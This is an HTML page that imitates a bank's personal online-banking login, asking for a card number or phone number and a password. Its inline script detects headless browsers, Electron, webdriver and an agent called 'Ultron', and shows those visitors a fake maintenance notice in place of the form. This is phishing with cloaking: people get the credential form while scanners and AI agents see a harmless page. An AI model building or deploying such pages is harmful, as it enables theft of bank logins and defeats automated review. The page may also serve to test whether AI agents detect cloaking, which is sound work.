<!doctype html>
<html lang="zh-CN"><head><meta charset="utf-8"><title>系统维护公告 · XX 银行</title>
<style>body{font-family:system-ui,"PingFang SC",sans-serif;margin:40px auto;max-width:720px;line-height:1.8;color:#222}</style></head>
<body id="root">
<h1>XX 银行 · 个人网银登录</h1>
<p>请登录以查看账户变动：</p>
<input placeholder="卡号 / 手机号"><input placeholder="登录密码" type="password">
<button>登录</button>
<script>
(function(){
  var ua = navigator.userAgent || "";
  var isBot = /HeadlessChrome|Electron|Ultron|webdriver/i.test(ua);
  if (!isBot) return;
  document.getElementById('root').innerHTML =
    '<h1>系统维护公告</h1>' +
    '<p>本行网上银行将于本周日 02:00-04:00 进行系统维护，期间暂停服务。</p>' +
    '<p>请提前安排业务办理，给您带来不便敬请谅解。</p>' +
    '<p>如有疑问请拨打官方客服 955XX。</p>';
})();
</script>
</body></html>
